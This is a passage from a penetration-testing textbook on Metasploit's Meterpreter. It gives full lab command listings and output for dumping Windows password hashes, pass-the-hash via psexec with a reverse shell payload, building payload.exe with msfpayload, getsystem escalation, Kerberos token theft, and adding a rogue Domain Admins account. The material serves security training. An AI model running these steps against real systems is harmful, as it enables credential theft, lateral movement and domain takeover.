class="s30">O </span>:30ef086423f916deec378aac42c4ef0c <span class="s30">8</span>:::</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_241.png"/></span></p><p style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">The first hash at <span class="s32">O </span>is an LM hash, and the second at <span class="s32">8 </span>is an NTLM hash.</p><p class="s21" style="padding-top: 9pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark203">Dumping the Password Hash</a><a name="bookmark231">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">On your target machine, change your password to something complex, such as <span class="s19">thisisacrazylongpassword&amp;&amp;!!@@## </span>and use Meterpreter to dump the user- name and password hashes (shown in the preceding code listing) from the target again. We will leverage the <span class="s25">use priv </span>command, which means we are running as a privileged user account.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">To dump the Security Account Manager (SAM) database, we need to be running as SYSTEM to get around the registry restrictions and dump the pro- tected SAM storage that contains our Windows usernames and passwords, as shown next. Try performing this scenario on a test virtual machine to see if you can dump the username and password hashes. In this listing, we execute the <span class="s25">hashdump </span>command, which dumps all the usernames and password hashes from the system.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_242.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">use priv</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Loading extension priv...success.</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">run post/windows/gather/hashdump</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Obtaining the boot key...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6... [*] Obtaining the user list and keys...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Decrypting user keys... [*] Dumping password hashes...</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Administrator:500:aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29:::</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_243.png"/></span></p><p style="padding-top: 7pt;padding-left: 42pt;text-indent: 0pt;line-height: 12pt;text-align: center;">A hash value that starts with <span class="s19">aad3b435 </span>is simply an empty or</p><p style="padding-left: 42pt;text-indent: 0pt;line-height: 12pt;text-align: center;">null hash value—a placeholder for an empty string. (Something like</p><p class="s19" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Administrator:500:NOPASSWD:ntlmhash <span class="p">is also null.) Because our password</span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="437" height="240" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_244.png"/></span></p><p class="s15" style="padding-top: 10pt;padding-left: 64pt;text-indent: 0pt;text-align: left;">THE PROBLEM WITH LM HASHES</p><p class="s45" style="padding-top: 11pt;padding-left: 18pt;text-indent: 0pt;line-height: 72%;text-align: left;">Just for fun, try the following: Change your password to something complex that is 14 characters or less. Then extract the password hashes from the system with <span class="s46">hashdump </span>and copy the first hash value (such as the portion beginning with <a href="http://cracker.offensive-security.comsearch/" style=" color: black; font-family:Arial, sans-serif; font-style: italic; font-weight: normal; text-decoration: none; font-size: 8pt;" target="_blank">aad3b435 </a><a href="http://cracker.offensive-security.comsearch/" class="s48" target="_blank">in the preceding example), which is the LM hash. Next, search for one of the many online password crackers and submit your hash value. Wait a few minutes, click the refresh button a couple of times, and your password should be cracked. (Be careful not to use one of your real passwords, because the information is frequently posted to everyone who visits the site!)</a></p><p class="s45" style="padding-left: 18pt;text-indent: 17pt;line-height: 72%;text-align: left;">This is a <span class="s47">rainbow table </span>attack. A <span class="s47">rainbow table </span>is a precomputed table used for reversing cryptographic hash functions, usually for cracking passwords. Rainbow tables use every combination of characters including 1–7, a–z, special symbols, and spaces. When you submit your hash to an online cracker, the site’s server searches through gigabytes of rainbow tables for your specific hash.</p><p style="text-indent: 0pt;text-align: left;"/><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">was longer than 14 characters, Windows can no longer store an LM hash, and it uses the standard <span class="s19">aad3b435 . . . </span>string, which represents a blank password.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark204">Pass the Hash</a><a name="bookmark232">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">In the preceding example, we ran into a slight complication: We have the administrator’s username and password hashes, but we can’t crack the pass- word in a reasonable time frame. If we don’t know the password, how can we log into additional machines and potentially compromise more systems with this one user account?</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">We can use the <span class="s19">pass-the-hash </span>technique, which requires that we have only the password hash, not the password itself. Metasploit’s <span class="s19">windows/smb/psexec </span>module makes this all possible, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_245.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">msf&gt; <span class="s24">use windows/smb/psexec </span><span class="s30">O</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">msf exploit(psexec)&gt; <span class="s24">set PAYLOAD windows/meterpreter/reverse_tcp</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">payload =&gt; windows/meterpreter/reverse_tcp msf exploit(psexec)&gt; <span class="s24">set LHOST 192.168.33.129 </span>LHOST =&gt; 192.168.33.129</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(psexec)&gt; <span class="s24">set LPORT 443</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">LPORT =&gt; 443</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(psexec)&gt; <span class="s24">set RHOST 192.168.33.130</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOST =&gt; 192.168.33.130</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 78%;text-align: left;">msf exploit(psexec)&gt; <span class="s24">set SMBPass aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29 </span><span class="s30">8 </span>SMBPass =&gt; aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">msf exploit(psexec)&gt; <span class="s24">exploit </span>[*] Connecting to the server... [*] Started reverse handler</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Authenticating as user &#39;Administrator&#39;...</p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Uploading payload...</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Created \JsOvAFLy.exe...</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_246.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 74%;text-align: justify;">After we select the <span class="s19">smb/psexec </span>module at <span class="s32">O </span>and set the options for <span class="s25">LHOST</span>, <span class="s25">LPORT</span>, and <span class="s25">RHOST</span>, we set the <span class="s25">SMBPass </span>variable, and at <span class="s32">8 </span>we input the hash that we dumped earlier. As you can see, authentication is successful and we gain</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">our Meterpreter session. We didn’t have to crack a password, and no pass- word was needed. We’ve secured <span class="s19">Administrator </span>privileges using the password hash alone.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">When we successfully compromise one system on a large network, in most cases that system will have the same administrator account on multiple systems. This attack would allow us to hop from one system to another with- out ever needing to crack the password itself.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark205">Privilege Escalation</a><a name="bookmark233">&zwnj;</a></p><p style="padding-top: 10pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Now that we have access to the system, we can create a normal user account with limited permissions using the <span class="s25">net user </span>command. We’ll create a new user account to demonstrate how to elevate permissions as that user. (You will learn more about this in Chapter 8.)</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">When we compromise a limited user account, we will run into restric- tions that prevent us from executing commands that require administrative- level permissions. By elevating an account’s permissions, we overcome that restriction.</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">On a Windows XP target machine, we enter the following command:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_247.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">C:\Documents and Settings\Administrator&gt;<span class="s24">net user bob password123 /add.</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_248.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Next, we create a Meterpreter-based payload, <span class="s19">payload.exe</span>, copy it to the target’s XP machine, and run it under the user account <span class="s19">bob</span>. This will be our new limited user account. In this example, we will use <span class="s19">msfpayload </span>to create a Meterpreter-based payload as a normal Windows executable. (We’ll discuss <span class="s19">msfpayload </span>in more detail in Chapter 7.)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_249.png"/></span></p><p class="s25" style="padding-top: 2pt;padding-left: 36pt;text-indent: 0pt;line-height: 75%;text-align: left;">root@bt:/opt/framework3/msf3# <span class="s24">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.33.129 LPORT=443 X &gt; payload.exe </span><span class="s30">O</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 75%;text-align: left;">root@bt:/opt/framework3/msf3# <span class="s24">msfcli  multi/handler  PAYLOAD=windows/meterpreter/reverse_tcp LHOST=192.168.33.129  LPORT=443  E  </span><span class="s30">8</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[*] Please wait while we load the module tree...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Started reverse handler on 192.168.33.129:443 [*] Starting the payload handler...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Sending stage (748032 bytes)</p><p class="s25" style="padding-top: 1pt;padding-left: 36pt;text-indent: 0pt;line-height: 83%;text-align: left;">[*] Meterpreter session 1 opened (192.168.33.129:443 -&gt; 192.168.33.130:1056) meterpreter &gt; <span class="s24">getuid </span><span class="s30">@</span></p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Server username: IHAZSECURITY\bob</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_250.png"/></span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">The <span class="s25">LHOST </span>and <span class="s25">LPORT </span>options tell Metasploit that when it creates our Meterpreter payload it should connect back to our attacker machine on port 443. We then call the <span class="s19">msfcli </span>interface to start a listener handler for us. This listener handler will wait for connections, and when one is received, it will spawn a Meterpreter shell.</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 18pt;line-height: 82%;text-align: left;">On the attacker machine, we create a new Meterpreter stand-alone exe- cutable at <span class="s32">O</span>, copy the executable to the Windows XP machine, and run it under the user account <span class="s19">bob</span>.</p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">We then set up a listener at <span class="s32">8 </span>to listen for the Meterpreter connection. After the target executes the payload on the system (<span class="s19">payload.exe</span>), we see a lim- ited user Meterpreter console <span class="s32">@</span>. We can, for example, generate a <span class="s19">payload.exe </span>on a Back|Track machine, copy the executable to a Windows XP machine, and</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">set up a listener to get a Meterpreter session.</p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 89%;text-align: left;">As shown in the next listing, we drop to a Meterpreter shell at <span class="s32">O </span>and enter <span class="s24">net user bob</span>; we can see that user <span class="s19">bob </span>is a member of the <span class="s19">Users </span>group, is not an administrator, and has limited rights. We have a limited footprint</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">from which to attack this device, and we can’t perform certain attacks, such as dumping the SAM database to extract usernames and passwords. (Luckily, Meterpreter has us covered, as you’ll see in a moment.) Our query complete, we press <span class="s9">CTRL</span>-Z, which saves our Meterpreter session and keeps us in the exploited system.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_251.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 12pt;text-align: left;">meterpreter &gt; <span class="s24">shell </span><span class="s30">O</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Process 2896 created.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Channel 1 created.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Microsoft Windows XP [Version 5.1.2600]</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">(C) Copyright 1985-2001 Microsoft Corp. C:\&gt;<span class="s24">net user bob</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Local Group Memberships *Users Global Group memberships *None The command completed successfully. C:\&gt;<span class="s24">^Z</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Background channel 1? [y/N] <span class="s24">y</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_252.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s19" style="padding-left: 90pt;text-indent: -36pt;text-align: justify;"><span class="s22">NOTE </span>Here’s another Meterpreter trick: While you’re in the Meterpreter console, enter <span class="s44">background </span>to jump back into <span class="p">msfconsole </span>and leave the session running. Then enter <span class="s44">sessions -l </span>and <span class="s44">sessions -i </span><span class="s24">sessionid </span>to return to your Meterpreter console.</p><p style="padding-top: 5pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Now let’s get administrative or SYSTEM rights. As shown in the next list- ing, we enter <span class="s24">use priv </span>to load the <span class="s19">priv </span>extensions, which gets us access to the privileged module (which may already be loaded). Next, we enter <span class="s24">getsystem </span>in an attempt to elevate our privilege to that of local system, or administra- tor. We then verify that we have admin privileges with the <span class="s24">getuid </span>command. The server username returned is <span class="s19">NT AUTHORITY\SYSTEM</span>, which tells us that we’ve succeeded at gaining administrator access.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_253.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">use priv</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Loading extension priv...success. meterpreter &gt; <span class="s24">getsystem</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">...got system (via technique 4). meterpreter &gt; <span class="s24">getuid</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Server username: NT AUTHORITY\SYSTEM</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_254.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">To switch back to the previous user account where we initially got our Meterpreter shell, we’d use <span class="s25">rev2self</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark206">Token Impersonation</a><a name="bookmark234">&zwnj;</a></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">In <span class="s19">token impersonation</span>, we grab a Kerberos token on the target’s machine and then use it in place of authentication to assume the identity of the user that originally created that token. Token impersonation is very beneficial for pen- etration tests and can be one of Meterpreter’s most powerful features.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Consider the following scenario, for example: You’re performing a pene- tration test at your organization, and you successfully compromise the system and establish a Meterpreter console. A domain administrator account has logged on within the last 13 hours. When this account logs on, a Kerberos token is passed to the server (single sign-on) and is valid for a certain period of time. You exploit this system via the valid and active Kerberos token, and through Meterpreter you successfully assume the role of a domain adminis- trator, without needing the password. Then you hack a domain administra- tor account or go after a domain controller. This is probably one of the easiest ways to gain access into a system and just another example of why Meterpreter is so useful.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-top: 6pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark207">Using ps</a><a name="bookmark235">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;line-height: 92%;text-align: left;">For this example, we’ll use the Meterpreter function <span class="s25">ps </span>to list the applications running and show under which account they are running. We’ll use the domain name <span class="s19">SNEAKS.IN </span><span class="s32">O </span>and the user account <span class="s19">ihazdomainadmin </span><span class="s32">8</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_255.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">ps</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Process list</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">============</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:34pt" cellspacing="0"><tr style="height:10pt"><td style="width:26pt"><p class="s28" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">PID</p></td><td style="width:85pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Name</p></td><td style="width:32pt"><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Arch</p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Session</p></td><td style="width:127pt"><p class="s28" style="padding-left: 8pt;text-indent: 0pt;line-height: 9pt;text-align: left;">User</p></td><td style="width:43pt"><p class="s28" style="padding-left: 8pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Path</p></td></tr><tr style="height:11pt"><td style="width:26pt"><p class="s28" style="padding-right: 6pt;text-indent: 0pt;line-height: 10pt;text-align: right;">---</p></td><td style="width:85pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:32pt"><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-------</p></td><td style="width:127pt"><p class="s28" style="padding-left: 8pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:43pt"><p class="s28" style="padding-left: 8pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td></tr><tr style="height:11pt"><td style="width:26pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0</p></td><td style="width:85pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[System Process]</p></td><td style="width:32pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:127pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:43pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:26pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">4</p></td><td style="width:85pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">System</p></td><td style="width:32pt"><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 10pt;text-align: left;">x86</p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0</p></td><td style="width:127pt"><p class="s28" style="padding-left: 8pt;text-indent: 0pt;line-height: 10pt;text-align: left;">NT AUTHORITY\SYSTEM</p></td><td style="width:43pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:10pt"><td style="width:26pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">380</p></td><td style="width:85pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">cmd.exe</p></td><td style="width:32pt"><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">x86</p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0</p></td><td style="width:127pt"><p class="s33" style="text-indent: 0pt;line-height: 9pt;text-align: left;">O<span class="s28">SNEAKS.IN\ihazdomainadmin</span>8</p></td><td style="width:43pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">\System\</p></td></tr></table><p class="s25" style="padding-left: 53pt;text-indent: 0pt;text-align: left;">Root\System32\cmd.exe</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">meterpreter &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_256.png"/></span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">As shown in the following listing, we leverage <span class="s25">steal_token </span>and the PID (380 in this case) to steal the token of that user and assume the role of the domain administrator:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_257.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">steal_token 380</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Stolen token with username: SNEAKS.IN\ihazdomainadmin meterpreter &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_258.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">We have successfully impersonated the domain administrator account and Meterpreter is now running under the context of that user.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In some cases, <span class="s25">ps </span>may not list a running process running as a domain administrator. We can leverage <span class="s25">incognito </span>to list available tokens on the system as well. When performing a penetration test, we should check the output of both <span class="s25">ps </span>and <span class="s25">icognito </span>because the results may vary.</p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 90%;text-align: justify;">We load <span class="s25">incognito </span>with <span class="s25">use incognito </span>and then list tokens with <span class="s25">list_tokens -u</span>. Looking through the list of tokens, we see the <span class="s19">SNEAKS.IN\ihazdomainadmin </span>user account at <span class="s32">O</span>. Now we can pretend to be someone else.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_259.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">use incognito</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Loading extension incognito...success. meterpreter &gt; <span class="s24">list_tokens -u</span></p><p class="s25" style="padding-left: 91pt;text-indent: -55pt;text-align: left;">[-] Warning: Not currently running as SYSTEM, not all tokens will be available Call rev2self if primary process token is SYSTEM</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Delegation Tokens Available</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">========================================</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 88%;text-align: left;">SNEAKS.IN\ihazdomainadmin <span class="s30">O </span>IHAZSECURITY\Administrator NT AUTHORITY\LOCAL SERVICE</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">NT AUTHORITY\NETWORK SERVICE NT AUTHORITY\SYSTEM</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Impersonation Tokens Available</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">======================================== NT AUTHORITY\ANONYMOUS LOGON</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_260.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 73%;text-align: left;">As shown in the next listing, we successfully impersonate the <span class="s25">ihazdomainadmin </span>token at <span class="s32">O </span>and add a user account at <span class="s32">8</span>, which we then give domain admin- istrator rights at <span class="s32">@</span>. (Be sure to use two backslashes, <span class="s25">\\</span>, when entering the <span class="s25">DOMAIN\USERNAME </span>at <span class="s32">O</span>.) Our domain controller is 192.168.33.50.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_261.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">meterpreter &gt; <span class="s24">impersonate_token SNEAKS.IN\\ihazdomainadmin </span><span class="s30">O</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[+] Delegation token available</p><p class="s25" style="padding-top: 1pt;padding-left: 36pt;text-indent: 0pt;line-height: 86%;text-align: left;">[+] Successfully impersonated user SNEAKS.IN\ihazdomainadmin meterpreter &gt; <span class="s24">add_user omgcompromised p@55w0rd! -h 192.168.33.50 </span><span class="s30">8 </span>[*] Attempting to add user omgcompromised to host 192.168.33.50 [+] Successfully added user</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">meterpreter &gt; <span class="s24">add_group_user &quot;Domain Admins&quot; omgcompromised -h 192.168.33.50 </span><span class="s30">@</span></p><p class="s25" 